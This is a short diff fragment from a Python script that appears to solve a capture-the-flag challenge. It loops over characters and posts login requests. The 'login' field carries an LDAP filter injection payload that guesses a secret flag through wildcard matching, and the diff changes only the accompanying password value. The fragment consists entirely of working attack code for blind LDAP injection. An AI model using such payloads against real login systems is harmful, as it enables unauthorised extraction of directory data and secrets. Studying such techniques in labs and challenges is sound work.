@@ -17,7 +17,7 @@ def main():
 		for i in Array:
 			data = {
 				"login": f"{user})(|(mail={flag}{i}*",
-				"password": "1)"
+				"password": "1337)"
 			}
 			q = requests.post(URL, data = data)
 
